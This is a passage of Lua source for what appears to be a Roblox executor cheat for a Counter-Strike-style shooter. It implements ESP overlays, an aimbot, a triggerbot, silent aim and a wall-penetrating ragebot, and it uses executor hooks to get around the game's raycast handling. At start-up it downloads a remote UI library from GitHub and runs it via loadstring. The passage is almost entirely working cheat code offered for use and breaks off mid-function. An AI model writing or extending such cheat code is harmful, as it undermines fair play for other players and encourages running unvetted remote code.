setfpscap(600)
if getgenv().ValenokUnload then pcall(getgenv().ValenokUnload) end

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Camera = game:GetService("Workspace").CurrentCamera
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local VirtualInputManager = game:GetService("VirtualInputManager")
local HttpService = game:GetService("HttpService")

local CONSTANTS = {
    DEFAULT_WALK_SPEED = 16,
    OBSIDIAN_REPO = "https://raw.githubusercontent.com/deividcomsono/Obsidian/main/",
    SKIN_FILE = "Valenok_skin/Skin.json",
    MAX_HIT_CHAMS_CLONES = 25,
    ESP_BOX_TOP_OFFSET = 2.45,
    ESP_BOX_BOTTOM_OFFSET = -3.1,
    ESP_BOX_THICKNESS = 1,
    ESP_BOX_OUTLINE_THICKNESS = 3,
    ESP_HEALTH_BAR_WIDTH = 1.5,
    ESP_HEALTH_BAR_OUTLINE_THICKNESS = 3,
    ESP_HEALTH_BAR_GAP = 1,
    ESP_FONT = 2,
    ESP_TEXT_SIZE = 13,

    TracerTextureMap = {
        Solid=446111271,Lightning=7216850022,Laser=7136858729,["Twisted Energy"]=7071778278,
        ["Anime Lazer"]=17441065350,Arrow=1274378728,Minecraft=152410036,["Alien Energy Ray"]=6091341618,
        ["Energy Ray"]=13832105797,Matrix=15097610754,["Cartoony Eletric"]=18722421816,
    },
    HitSounds = {
        Skeet=5633695679,Neverlose=6534948092,Bameware=3124331820,Bell=6534947240,Bubble=6534947588,
        Pick=1347140027,Pop=198598793,Rust=1255040462,Sans=3188795283,Fart=130833677,Big=5332005053,
        Vine=5332680810,Bruh=4578740568,Fatality=6534947869,Bonk=5766898159,Minecraft=4018616850,
        Moan={2440888376,2440889605,2440889869,2440889381,2440891382},
    },
    AimHitboxFallbacks = {
        Head = { "HeadHB", "Head", "FakeHead" },
        Body = { "UpperTorso", "LowerTorso", "Torso", "HumanoidRootPart" },
        Arms = {
            "LeftUpperArm", "LeftLowerArm", "LeftHand",
            "RightUpperArm", "RightLowerArm", "RightHand",
        },
        Legs = {
            "LeftUpperLeg", "LeftLowerLeg", "LeftFoot",
            "RightUpperLeg", "RightLowerLeg", "RightFoot",
        },
    },
    RageHitboxPriority = { "Head", "Body", "Arms", "Legs" },
    RagebotDefaultHitboxes = { Head = true },
    RagebotDefaultMaxWalls = 3,
    RealHitboxNames = {
        "Head", "HeadHB", "FakeHead",
        "UpperTorso", "LowerTorso", "HumanoidRootPart",
        "LeftUpperArm", "LeftLowerArm", "LeftHand",
        "RightUpperArm", "RightLowerArm", "RightHand",
        "LeftUpperLeg", "LeftLowerLeg", "LeftFoot",
        "RightUpperLeg", "RightLowerLeg", "RightFoot",
    },
    RealHitboxLookup = {},
    GRENADE_PARAMS = {
        LOOK_SPEED = 100,
        PLR_FACTOR = 1.0,
        UP_BIAS = 12,
        default = { maxBounces = 3, bounceDamping = 0.42 },
        molotov = { maxBounces = 5, bounceDamping = 0.4 },
        he = { maxBounces = 4, bounceDamping = 0.55 },
        smoke = { maxBounces = 3, bounceDamping = 0.38 },
        flash = { maxBounces = 4, bounceDamping = 0.55 },
        decoy = { maxBounces = 3, bounceDamping = 0.42 },
    },
}

for _, name in ipairs(CONSTANTS.RealHitboxNames) do
    CONSTANTS.RealHitboxLookup[name] = true
end

local Library, ThemeManager, SaveManager
local success, err = pcall(function()
    local repo = CONSTANTS.OBSIDIAN_REPO
    Library = loadstring(game:HttpGet(repo .. "Library.lua"))()
    ThemeManager = loadstring(game:HttpGet(repo .. "addons/ThemeManager.lua"))()
    SaveManager = loadstring(game:HttpGet(repo .. "addons/SaveManager.lua"))()
end)

if not success then
    warn("UI Library error: " .. tostring(err))
    game.Players.LocalPlayer:Kick("UI Lib ERROR (RAC BAN RISK)")
end

if Library then
    Options = Library.Options
    Toggles = Library.Toggles

    Library.ForceCheckbox = false
    Library.ShowToggleFrameInKeybinds = true

    function Library:IsMenuVisible()
        return self.Toggled == true
    end
end

local Cache = {}
local CacheData, CacheExpiry = {}, {}

function Cache:get(key)
    local expiry = CacheExpiry[key]
    if expiry == nil then return nil end
    if expiry ~= 0 and tick() > expiry then
        CacheData[key] = nil
        CacheExpiry[key] = nil
        return nil
    end
    return CacheData[key]
end

function Cache:set(key, value, ttl)
    CacheData[key] = value
    CacheExpiry[key] = (ttl and ttl > 0) and (tick() + ttl) or 0
end

function Cache:invalidate(key)
    CacheData[key] = nil
    CacheExpiry[key] = nil
end

function Cache:getOrSet(key, ttl, factoryFn)
    local value = Cache:get(key)
    if value ~= nil then return value end
    value = factoryFn()
    if value ~= nil then
        Cache:set(key, value, ttl)
    end
    return value
end

local EspRuntime = {
    Drawings = {},
    ItemDrawings = {},
    Highlights = {},
    Chams = {},
    Connections = {},
}

local EspFrameCache = {
    tick = 0,
    anyEnabled = false,
    toggles = {},
    options = {},
    colors = {},
    boxFillTransparency = 1,
    chamsVisibleTransparency = 0.35,
    chamsWallTransparency = 0.35,
}

local EspPlayerCache = {}

local function invalidateEspPlayerCache(player)
    EspPlayerCache[player] = nil
end

local function getCachedCharacterParts(player)
    local cached = EspPlayerCache[player]
    local character = player.Character
    if not character or not character.Parent then
        EspPlayerCache[player] = nil
        return nil, nil, nil
    end
    if cached and cached.character == character then
        if cached.humanoid and cached.humanoid.Parent and cached.rootPart and cached.rootPart.Parent then
            return character, cached.humanoid, cached.rootPart
        end
    end
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    local rootPart = character:FindFirstChild("HumanoidRootPart")
    if not humanoid or not rootPart then
        EspPlayerCache[player] = nil
        return character, humanoid, rootPart
    end
    EspPlayerCache[player] = {
        character = character,
        humanoid = humanoid,
        rootPart = rootPart,
    }
    return character, humanoid, rootPart
end

local function getCachedHead(player, character)
    local cached = EspPlayerCache[player]
    if cached and cached.character == character then
        if cached.head and cached.head.Parent then return cached.head end
        if cached.head == false then return nil end
    end
    local head = character:FindFirstChild("Head") or character:FindFirstChild("HeadHB")
    if cached then
        cached.character = character
        cached.head = head or false
    end
    return head
end

local VisibilityParams = RaycastParams.new()
VisibilityParams.FilterType = Enum.RaycastFilterType.Exclude
VisibilityParams.IgnoreWater = true

local ForwardTrackParams = RaycastParams.new()
ForwardTrackParams.FilterType = Enum.RaycastFilterType.Exclude
ForwardTrackParams.IgnoreWater = true

local RuntimePack = {
    silentActive = false,
    HitpartSilent = {
        lastFire = 0,
        lastTargetScan = 0,
        lastCtxRefresh = 0,
        lastFireRateRefresh = 0,
        injecting = false,
        skipWeapHook = false,
        fireRate = 0.1,
        fireRateObj = nil,
        isHitpart = true,
        isRay = false,
        remote = nil,
        gunName = nil,
        charGun = nil,
        gunData = nil,
        flashed = false,
        noscope = false,
        airborne = false,
        smokeParams = nil,
        smokeFolder = nil,
        smokeFolderTick = 0,
    },

    mapFolder = nil,
    mapClips = nil,
    mapSpawns = nil,
    weaponsFolder = nil,
    playerGui = nil,
    guiFrame = nil,
}
local HitpartSilent = RuntimePack.HitpartSilent
local drawBulletTracer
local SC = {}

local function getCamera()
    Camera = Workspace.CurrentCamera
    return Camera
end

local function getMapFolder()
    if RuntimePack.mapFolder and RuntimePack.mapFolder.Parent then return RuntimePack.mapFolder end
    RuntimePack.mapFolder = Workspace:FindFirstChild("Map")
    RuntimePack.mapClips = nil
    RuntimePack.mapSpawns = nil
    return RuntimePack.mapFolder
end

local function getMapClips()
    local map = getMapFolder()
    if not map then return nil end
    if RuntimePack.mapClips and RuntimePack.mapClips.Parent then return RuntimePack.mapClips end
    RuntimePack.mapClips = map:FindFirstChild("Clips")
    return RuntimePack.mapClips
end

local function getMapSpawns()
    local map = getMapFolder()
    if not map then return nil end
    if RuntimePack.mapSpawns and RuntimePack.mapSpawns.Parent then return RuntimePack.mapSpawns end
    RuntimePack.mapSpawns = map:FindFirstChild("SpawnPoints")
    return RuntimePack.mapSpawns
end

local function getWeaponsFolder()
    if RuntimePack.weaponsFolder and RuntimePack.weaponsFolder.Parent then return RuntimePack.weaponsFolder end
    RuntimePack.weaponsFolder = ReplicatedStorage:FindFirstChild("Weapons")
    return RuntimePack.weaponsFolder
end

local function getPlayerGui()
    if RuntimePack.playerGui and RuntimePack.playerGui.Parent then return RuntimePack.playerGui end
    RuntimePack.playerGui = LocalPlayer:FindFirstChild("PlayerGui")
    return RuntimePack.playerGui
end

local function getGuiFrame()
    local pg = getPlayerGui()
    if not pg then return nil end
    if RuntimePack.guiFrame and RuntimePack.guiFrame.Parent then return RuntimePack.guiFrame end
    RuntimePack.guiFrame = pg:FindFirstChild("GUI")
    return RuntimePack.guiFrame
end

local function getCachedClient()
    return Cache:getOrSet("Client", 5, function()
        local pg = getPlayerGui()
        local cg = pg and pg:FindFirstChild("Client")
        if not cg then return nil end
        local success, client = pcall(getsenv, cg)
        if success then return client end
        return nil
    end)
end

local function getCachedRayIgnore()
    return Cache:getOrSet("RayIgnore", 1.5, function()
        return Workspace:FindFirstChild("Ray_Ignore")
    end)
end

local RayIgnoreListCache = { list = nil, t = 0 }
ModeCache = { t = 0, value = false }
TeamIgnoreCache = { t = 0, value = false }
RayIgnoreMemo = {}
IgnoreRootsCache = {}
CharIgnorePartsCache = {}
local EnemyRayIgnoreNames = {
    HumanoidRootPart = true,
    Gun = true,
    Head = true,
    BackC4 = true,
}
for i = 1, 15 do
    EnemyRayIgnoreNames["Hat" .. i] = true
end

invalidateCharIgnoreParts = function(character)
    if character then CharIgnorePartsCache[character] = nil end
end

local function isCompetitiveOrDeathmatch()
    local now = tick()
    if now - ModeCache.t < 1 then return ModeCache.value end
    ModeCache.t = now

    local status = Workspace:FindFirstChild("Status")
    if not status then
        local lpStatus = LocalPlayer:FindFirstChild("Status")
        status = lpStatus
    end
    if not status then
        ModeCache.value = false
        return false
    end

    local modeObj = status:FindFirstChild("Mode")
        or status:FindFirstChild("GameMode")
        or status:FindFirstChild("Gamemode")
        or status:FindFirstChild("Type")
        or status:FindFirstChild("GameType")
    if not modeObj then
        ModeCache.value = false
        return false
    end

    local mode = tostring(modeObj.Value or modeObj):lower()
    if mode == "" then
        ModeCache.value = false
        return false
    end
    local matched = mode:find("comp", 1, true)
        or mode:find("death", 1, true)
        or mode == "dm"
        or mode:find("competitive", 1, true)
        or mode:find("deathmatch", 1, true)
    ModeCache.value = matched and true or false
    return ModeCache.value
end

local function isSameTeamPlayer(player)
    if not player or player == LocalPlayer then return false end
    local myTeam, theirTeam = LocalPlayer.Team, player.Team
    if myTeam ~= nil and theirTeam ~= nil and myTeam == theirTeam then
        return true
    end
    local myTeamColor, theirTeamColor = LocalPlayer.TeamColor, player.TeamColor
    if myTeamColor ~= nil and theirTeamColor ~= nil and myTeamColor == theirTeamColor then
        return true
    end

    local myStatus = LocalPlayer:FindFirstChild("Status")
    local theirStatus = player:FindFirstChild("Status")
    local myStatusTeam = myStatus and myStatus:FindFirstChild("Team")
    local theirStatusTeam = theirStatus and theirStatus:FindFirstChild("Team")
    if myStatusTeam and theirStatusTeam then
        local a, b = myStatusTeam.Value, theirStatusTeam.Value
        if a ~= nil and b ~= nil and a ~= "" and b ~= "" and a == b then
            return true
        end
    end
    return false
end

local function shouldRayIgnoreTeammates()
    local now = tick()
    if now - TeamIgnoreCache.t < 0.25 then return TeamIgnoreCache.value end
    TeamIgnoreCache.t = now
    local value = true
    if Toggles.AimbotTeamCheck and not Toggles.AimbotTeamCheck.Value then value = false
    elseif Toggles.TriggerbotTeamCheck and not Toggles.TriggerbotTeamCheck.Value then value = false
    elseif Toggles.RagebotTeamCheck and not Toggles.RagebotTeamCheck.Value then value = false
    else value = not isCompetitiveOrDeathmatch() end
    TeamIgnoreCache.value = value
    return value
end

local function appendEnemyRayIgnoreParts(list, character)
    if not character then return end
    local cached = CharIgnorePartsCache[character]
    if cached then
        if not character.Parent then
            CharIgnorePartsCache[character] = nil
            return
        end
        for i = 1, #cached do
            local part = cached[i]
            if part and part.Parent then table.insert(list, part) end
        end
        return
    end

    local parts = {}
    local hrp = character:FindFirstChild("HumanoidRootPart")
    if hrp then parts[#parts + 1] = hrp end
    local gun = character:FindFirstChild("Gun")
    if gun then parts[#parts + 1] = gun end
    local head = character:FindFirstChild("Head")
    if head then parts[#parts + 1] = head end
    local backC4 = character:FindFirstChild("BackC4")
    if backC4 then parts[#parts + 1] = backC4 end
    for i = 1, 15 do
        local hat = character:FindFirstChild("Hat" .. i)
        if hat then parts[#parts + 1] = hat end
    end
    CharIgnorePartsCache[character] = parts
    for i = 1, #parts do
        table.insert(list, parts[i])
    end
end

rebuildIgnoreRoots = function()
    table.clear(IgnoreRootsCache)
    local rayIgnore = Workspace:FindFirstChild("Ray_Ignore") or getCachedRayIgnore()
    local debris = Workspace:FindFirstChild("Debris")
    local clips = getMapClips()
    local spawns = getMapSpawns()
    local cam = getCamera() or Workspace.CurrentCamera
    local localChar = LocalPlayer.Character
    if rayIgnore then IgnoreRootsCache[#IgnoreRootsCache + 1] = rayIgnore end
    if debris then IgnoreRootsCache[#IgnoreRootsCache + 1] = debris end
    if clips then IgnoreRootsCache[#IgnoreRootsCache + 1] = clips end
    if spawns then IgnoreRootsCache[#IgnoreRootsCache + 1] = spawns end
    if cam then IgnoreRootsCache[#IgnoreRootsCache + 1] = cam end
    if localChar then IgnoreRootsCache[#IgnoreRootsCache + 1] = localChar end
end

local function buildRayIgnoreList()
    local now = tick()
    local ignoreFullTeammates = shouldRayIgnoreTeammates()
    local cached = RayIgnoreListCache.list
    if cached
        and (now - RayIgnoreListCache.t) < 0.005
        and RayIgnoreListCache.ignoreTeammates == ignoreFullTeammates
    then
        return cached
    end

    table.clear(RayIgnoreMemo)
    rebuildIgnoreRoots()

    local cam = getCamera() or Workspace.CurrentCamera
    local char = LocalPlayer.Character
    local rayIgnore = Workspace:FindFirstChild("Ray_Ignore") or getCachedRayIgnore()
    local debris = Workspace:FindFirstChild("Debris")
    local list = { cam, char, rayIgnore, debris }

    local clips = getMapClips()
    if clips then table.insert(list, clips) end
    local spawns = getMapSpawns()
    if spawns then table.insert(list, spawns) end
    if GrenadeRuntime and GrenadeRuntime.Folder then table.insert(list, GrenadeRuntime.Folder) end

    for _, player in ipairs(Players:GetPlayers()) do
        if player == LocalPlayer then continue end
        local pChar = player.Character
        if not pChar then continue end

        if ignoreFullTeammates and isSameTeamPlayer(player) then
            table.insert(list, pChar)
        else
            appendEnemyRayIgnoreParts(list, pChar)
        end
    end

    RayIgnoreListCache.list = list
    RayIgnoreListCache.t = now
    RayIgnoreListCache.ignoreTeammates = ignoreFullTeammates
    return list
end

local function isUnderRayIgnore(inst)
    if not inst then return false end
    local memo = RayIgnoreMemo[inst]
    if memo ~= nil then return memo end

    local roots = IgnoreRootsCache
    for i = 1, #roots do
        local root = roots[i]
        if root and (inst == root or inst:IsDescendantOf(root)) then
            RayIgnoreMemo[inst] = true
            return true
        end
    end

    if EnemyRayIgnoreNames[inst.Name] then
        local model = inst:FindFirstAncestorOfClass("Model")
        if model and Players:GetPlayerFromCharacter(model) then
            RayIgnoreMemo[inst] = true
            return true
        end
    end

    if shouldRayIgnoreTeammates() then
        local model = inst:FindFirstAncestorOfClass("Model")
        local plr = model and Players:GetPlayerFromCharacter(model)
        if plr and isSameTeamPlayer(plr) then
            RayIgnoreMemo[inst] = true
            return true
        end
    end

    RayIgnoreMemo[inst] = false
    return false
end

local function isSmokeLikePart(inst)
    if not inst then return false end
    local name = inst.Name
    if name == "Smoke" or name:find("Smoke") or name:find("Fire") or name:find("Flame") or name:find("Molotov") or name:find("Burn") then
        return true
    end
    if inst.Material == Enum.Material.Glass and inst.Transparency > 0.5 then return true end
    if inst.Transparency >= 0.9 and not inst.CanCollide then return true end
    return false
end

local RayIgnoreScratch = table.create(64)

local function copyRayIgnoreList()
    local base = buildRayIgnoreList()
    table.clear(RayIgnoreScratch)
    for i = 1, #base do
        RayIgnoreScratch[i] = base[i]
    end
    return RayIgnoreScratch, #base
end

local function shouldPierceRayHit(inst)
    if not inst then return false end
    if isUnderRayIgnore(inst) or isSmokeLikePart(inst) then return true end
    if inst.CanQuery == false then return true end
    if inst.Transparency >= 1 then return true end
    return false
end

local _controlTurnRemote
local function getControlTurnRemote()
    if _controlTurnRemote and _controlTurnRemote.Parent then return _controlTurnRemote end
    local events = ReplicatedStorage:FindFirstChild("Events")
    if events then
        _controlTurnRemote = events:FindFirstChild("ControlTurn")
    end
    if not _controlTurnRemote then
        _controlTurnRemote = ReplicatedStorage:FindFirstChild("ControlTurn")
    end
    return _controlTurnRemote
end

local function isKeybindActive(keybindState)
    if not keybindState or type(keybindState) ~= "table" then return false end

    local mode = keybindState.Mode

    if mode == "Always" then return true end
    if mode == "Toggle" then return keybindState.Toggled == true end

    local key = keybindState.Value
    if key == "None" then return false end

    if key == "MB1" or key == "MB2" or key == "MB3" then
        return (key == "MB1" and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1))
            or (key == "MB2" and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2))
            or (key == "MB3" and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton3))
    end

    local keyCode = Enum.KeyCode[key]
    return keyCode and UserInputService:IsKeyDown(keyCode) or false
end

local function isEnemyFor(player, teamCheckToggle)
    if player == LocalPlayer then return false end

    if teamCheckToggle and teamCheckToggle.Value then
        local myTeam, theirTeam = LocalPlayer.Team, player.Team
        local myTeamColor, theirTeamColor = LocalPlayer.TeamColor, player.TeamColor

        if myTeam ~= nil and theirTeam ~= nil and theirTeam == myTeam then
            return false
        end

        if myTeamColor ~= nil and theirTeamColor ~= nil and theirTeamColor == myTeamColor then
            return false
        end
    end

    return true
end

local function isEnemy(player)
    return isEnemyFor(player, Toggles.AimbotTeamCheck)
end

local function isTriggerEnemy(player)
    return isEnemyFor(player, Toggles.TriggerbotTeamCheck)
end

local function hasShield(character)
    if not character then return true end
    if character:FindFirstChild("PF") then return true end
    if character:FindFirstChild("Shield") then return true end
    if character:FindFirstChildOfClass("ForceField") then return true end
    return false
end

function RuntimePack.canCombatFire()
    local char = LocalPlayer.Character
    if not char then return false end
    if char:FindFirstChild("PF") then return false end
    if char:FindFirstChild("GroundSmashing") then return false end

    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum or hum.Health <= 0 then return false end
    if char:FindFirstChildOfClass("ForceField") then return false end

    local status = LocalPlayer:FindFirstChild("Status")
    local alive = status and status:FindFirstChild("Alive")
    if alive and alive.Value == false then return false end

    local wsStatus = Workspace:FindFirstChild("Status")
    local prep = wsStatus and wsStatus:FindFirstChild("Preparation")
    if prep and prep.Value == true then return false end

    local gui = getGuiFrame()
    local defusal = gui and gui:FindFirstChild("Defusal")
    if defusal and defusal.Visible == true then return false end

    if Workspace:FindFirstChild("Cutscene") or ReplicatedStorage:FindFirstChild("Cutscene") then
        return false
    end

    return true
end

local function findCharacterPart(character, partName)
    local part = character:FindFirstChild(partName)
    if part and part:IsA("BasePart") then
        return part
    end
end

local function getOptionColor(optionName, fallback)
    local option = Options[optionName]
    return (type(option) == "table" and option.Value) or fallback
end

local function getChamsTransparency(optionName, fallback)
    local opt = Options[optionName]
    if type(opt) == "table" and type(opt.Transparency) == "number" then
        return math.clamp(opt.Transparency, 0, 1)
    end
    return fallback or 0.35
end

local function createSquare(thickness, color)
    local s = Drawing.new("Square")
    s.Visible, s.Filled, s.Thickness, s.Transparency, s.Color = false, false, thickness, 1, color
    return s
end

local function createText()
    local t = Drawing.new("Text")
    t.Visible, t.Center, t.Outline, t.Transparency = false, true, true, 1
    t.Size, t.Font = CONSTANTS.ESP_TEXT_SIZE, CONSTANTS.ESP_FONT
    return t
end

local function createTriangle(filled, thickness, color)
    local t = Drawing.new("Triangle")
    t.Visible, t.Filled, t.Thickness, t.Transparency = false, filled and true or false, thickness or 1, 1
    t.Color = color or Color3.fromRGB(255, 255, 255)
    return t
end

EspRuntime.RemoveDrawingValue = function(value, seen)
    if value == nil then return end
    local vt = type(value)
    if vt == "table" then
        seen = seen or {}
        if seen[value] then return end
        seen[value] = true
        local hasRemove = false
        pcall(function() hasRemove = type(value.Remove) == "function" end)
        if hasRemove then
            pcall(function() value.Visible = false; value:Remove() end)
            return
        end
        for _, child in pairs(value) do EspRuntime.RemoveDrawingValue(child, seen) end
    elseif vt == "userdata" then
        pcall(function() value.Visible = false; value:Remove() end)
    end
end

local function round2(v)
    if typeof(v) == "Vector2" then
        return Vector2.new(math.floor(v.X + 0.5), math.floor(v.Y + 0.5))
    end
    return math.floor(v + 0.5)
end

local function getCharacterScreenBox(character, humanoid, rootPart)
    if not rootPart then return nil end
    local camera = getCamera()
    if not camera then return nil end
    local rootPos = rootPart.Position
    local top = Vector3.new(rootPos.X, rootPos.Y + CONSTANTS.ESP_BOX_TOP_OFFSET, rootPos.Z)
    local bottom = Vector3.new(rootPos.X, rootPos.Y + CONSTANTS.ESP_BOX_BOTTOM_OFFSET, rootPos.Z)
    local topScreen, topOn = camera:WorldToViewportPoint(top)
    local bottomScreen, bottomOn = camera:WorldToViewportPoint(bottom)
    if not topOn and not bottomOn then return nil end
    local height = bottomScreen.Y - topScreen.Y
    local width = height / 2
    local size = round2(Vector2.new(width, height))
    local position = round2(Vector2.new(topScreen.X - width / 2, topScreen.Y))
    return position.X, position.Y, size.X, size.Y
end

local function getCachedEquippedTool(player, character)
    local cached = EspPlayerCache[player]
    local now = tick()
    if cached and cached.character == character and cached.toolTick and (now - cached.toolTick) < 0.2 then
        return cached.toolName or ""
    end
    local eq = character and character:FindFirstChild("EquippedTool")
    local name = eq and tostring(eq.Value) or ""
    if cached then
        cached.character, cached.toolName, cached.toolTick = character, name, now
    end
    return name
end


local function isStrictRayVisible(targetPart)
    if not targetPart or not targetPart.Parent then return false end

    local cam = getCamera()
    if not cam then return false end

    local targetPos = targetPart.Position
    local origin = cam.CFrame.Position
    if (targetPos - origin).Magnitude <= 1e-4 then return false end

    local ignore, ignoreCount = copyRayIgnoreList()
    VisibilityParams.FilterDescendantsInstances = ignore

    for _ = 1, 12 do
        local dir = targetPos - origin
        if dir.Magnitude <= 1e-4 then return false end

        getgenv().IgnoreRaycastHook = true
        local success, result = pcall(function()
            return Workspace:Raycast(origin, dir, VisibilityParams)
        end)
        getgenv().IgnoreRaycastHook = false

        if not success or not result or not result.Instance then
            return false
        end

        local hitInst = result.Instance
        if hitInst == targetPart then
            return true
        end

        local hitParent = hitInst.Parent
        if hitParent and hitParent:IsA("Accessory") and hitParent.Parent == targetPart.Parent then
            return true
        end
        if hitParent == targetPart.Parent and hitInst:IsA("BasePart") then
            return true
        end

        if shouldPierceRayHit(hitInst) then
            ignoreCount = ignoreCount + 1
            ignore[ignoreCount] = hitInst
            VisibilityParams.FilterDescendantsInstances = ignore
            origin = result.Position + dir.Unit * 0.05
        else
            return false
        end
    end

    return false
end

local function isVisibleTarget(character)
    if not character then return false end
    local player = Players:GetPlayerFromCharacter(character)
    if player then
        local entry = CombatScan.byPlayer[player]
        if entry then
            return entry.strictPart ~= nil or entry.walls == 0
        end
    end

    local cam = getCamera()
    local origin = cam and cam.CFrame.Position
    if not origin then return false end

    local selectedHitbox = Options.AimbotHitbox and Options.AimbotHitbox.Value or "Head"
    for _, group in ipairs(CONSTANTS.RageHitboxPriority) do
        if CombatScan.rageHitboxOn(group, selectedHitbox) then
            for _, partName in ipairs(CONSTANTS.AimHitboxFallbacks[group]) do
                local part = findCharacterPart(character, partName)
                if part then
                    local point = CombatScan.findPoint(part, origin, 0, false)
                    if point then return true end
                end
            end
        end
    end

    return false
end

local function getWallCount(originPos, targetPos, maxWalls, targetCharacter)
    local toTarget = targetPos - originPos
    local distance = toTarget.Magnitude
    if distance < 0.001 then return 0 end

    local direction = toTarget.Unit
    local ignore, ignoreCount = copyRayIgnoreList()
    VisibilityParams.FilterDescendantsInstances = ignore

    local wallCount = 0
    local origin = originPos
    local maxIter = (maxWalls or 0) + 8

    getgenv().IgnoreRaycastHook = true
    local ok = pcall(function()
        for _ = 1, maxIter do
            local remaining = targetPos - origin
            local remMag = remaining.Magnitude
            if remMag < 0.05 then break end

            local result = Workspace:Raycast(origin, remaining, VisibilityParams)
            if not result or not result.Instance then
                break
            end

            local hitInst = result.Instance
            local hitParent = hitInst.Parent

            if hitInst == targetCharacter or (targetCharacter and hitInst:IsDescendantOf(targetCharacter)) then
                break
            end
            if hitParent and hitParent:FindFirstChildOfClass("Humanoid") then
                if targetCharacter and hitParent == targetCharacter then
                    break
                end
                ignoreCount = ignoreCount + 1
                ignore[ignoreCount] = hitInst
                VisibilityParams.FilterDescendantsInstances = ignore
                origin = result.Position + direction * 0.05
                continue
            end

            if shouldPierceRayHit(hitInst) then
                ignoreCount = ignoreCount + 1
                ignore[ignoreCount] = hitInst
                VisibilityParams.FilterDescendantsInstances = ignore
                origin = result.Position + direction * 0.05
            else
                wallCount = wallCount + 1
                if wallCount > (maxWalls or 0) + 1 then break end
                ignoreCount = ignoreCount + 1
                ignore[ignoreCount] = hitInst
                VisibilityParams.FilterDescendantsInstances = ignore
                origin = result.Position + direction * 0.05
            end
        end
    end)
    getgenv().IgnoreRaycastHook = false
    if not ok then return math.huge end
    return wallCount
end

local CombatScan = {
    stamp = -1,
    origin = nil,
    maxWalls = 0,
    byPlayer = {},
    list = {},
    ragePart = nil,
    ragePoint = nil,
    rageWalls = math.huge,
    multiFrame = 0,
}

function CombatScan.maxWallsAllowed()
    if not (Toggles.RagebotAutoPenetration and Toggles.RagebotAutoPenetration.Value) then
        return 0
    end
    return Options.SilentAimMaxWalls and Options.SilentAimMaxWalls.Value or CONSTANTS.RagebotDefaultMaxWalls
end

function CombatScan.clear()
    table.clear(CombatScan.byPlayer)
    table.clear(CombatScan.list)
    CombatScan.ragePart = nil
    CombatScan.ragePoint = nil
    CombatScan.rageWalls = math.huge
    CombatScan.origin = nil
end

local CombatPointOffsets = {
    CFrame.new(0.2, 0, 0),
    CFrame.new(-0.2, 0, 0),
    CFrame.new(0, 0.2, 0),
    CFrame.new(0, -0.2, 0),
    CFrame.new(0, 0, 0.2),
    CFrame.new(0, 0, -0.2),
}
local CombatMultiPoints = table.create(7)
local CombatSinglePoint = table.create(1)
local TriggerMagnetParts = { "Head", "HeadHB", "HumanoidRootPart", "UpperTorso", "Torso" }

function CombatScan.getPoints(part)
    if not part then return nil end
    local cf = part.CFrame
    local sx, sy, sz = part.Size.X * 0.45, part.Size.Y * 0.45, part.Size.Z * 0.45
    CombatMultiPoints[1] = cf.Position
    CombatMultiPoints[2] = (cf * CFrame.new(sx, 0, 0)).Position
    CombatMultiPoints[3] = (cf * CFrame.new(-sx, 0, 0)).Position
    CombatMultiPoints[4] = (cf * CFrame.new(0, sy, 0)).Position
    CombatMultiPoints[5] = (cf * CFrame.new(0, -sy, 0)).Position
    CombatMultiPoints[6] = (cf * CFrame.new(0, 0, sz)).Position
    CombatMultiPoints[7] = (cf * CFrame.new(0, 0, -sz)).Position
    return CombatMultiPoints
end

function CombatScan.findPoint(part, origin, maxWalls, useMulti)
    if not part or not origin then return nil, math.huge end
    maxWalls = maxWalls or 0
    local character = part.Parent
    local points
    if useMulti then
        points = CombatScan.getPoints(part)
    else
        CombatSinglePoint[1] = part.Position
        points = CombatSinglePoint
    end
    local bestPoint, bestWalls = nil, math.huge
    for i = 1, #points do
        local pt = points[i]
        local walls = getWallCount(origin, pt, maxWalls, character)
        if walls <= maxWalls and walls < bestWalls then
            bestWalls = walls
            bestPoint = pt
            if walls == 0 then break end
        end
    end
    return bestPoint, bestWalls
end

function CombatScan.computeForwardTrackPoint(head, rootPart, character)
    if not head or not rootPart then return nil end

    local velocity = rootPart.Velocity
    local t = Options.RagebotForwardTrackTime and Options.RagebotForwardTrackTime.Value or 1

    local predicted = head.Position + velocity * t
    local delta = predicted - head.Position
    if delta.Magnitude < 0.001 then return predicted end

    local ignore, ignoreCount = copyRayIgnoreList()
    ignoreCount = ignoreCount + 1
    ignore[ignoreCount] = character
    local myChar = LocalPlayer.Character
    if myChar then
        ignoreCount = ignoreCount + 1
        ignore[ignoreCount] = myChar
    end
    ForwardTrackParams.FilterDescendantsInstances = ignore

    getgenv().IgnoreRaycastHook = true
    local ok, result = pcall(function()
        return Workspace:Raycast(head.Position, delta, ForwardTrackParams)
    end)
    getgenv().IgnoreRaycastHook = false

    if ok and result then
        local velUnit = velocity.Unit
        predicted = velUnit.Magnitude > 0 and (result.Position - velUnit * 0.1) or result.Position
    end

    return predicted
end

function CombatScan.tryForwardTrackHit(head, rootPart, origin, character, maxWalls)
    if not (Toggles.RagebotForwardTrack and Toggles.RagebotForwardTrack.Value) then
        return nil, math.huge
    end
    local point = CombatScan.computeForwardTrackPoint(head, rootPart, character)
    if not point then return nil, math.huge end
    local walls = getWallCount(origin, point, maxWalls, character)
    if walls <= maxWalls then
        return point, walls
    end
    return nil, math.huge
end

function CombatScan.rageWanted()
    if not (Toggles.RagebotEnable and Toggles.RagebotEnable.Value) then return false end
    local rageKey = Options.RagebotKeybind
    if not rageKey then return true end
    if rageKey.Value == "None" or rageKey.Mode == "Always" then return true end
    return isKeybindActive(rageKey)
end

function CombatScan.aimWanted()
    return Toggles.AimbotEnable and Toggles.AimbotEnable.Value and isKeybindActive(Options.AimbotKeybind)
end

function CombatScan.triggerWanted()
    return Toggles.TriggerbotEnable and Toggles.TriggerbotEnable.Value and isKeybindActive(Options.TriggerbotKeybind)
end

function CombatScan.triggerHitboxOn(partName)
    local selected = Options.TriggerbotHitbox and Options.TriggerbotHitbox.Value
    if type(selected) ~= "table" then
        return partName == "Head" or partName == "HeadHB" or partName == "FakeHead"
    end
    for group, names in pairs(CONSTANTS.AimHitboxFallbacks) do
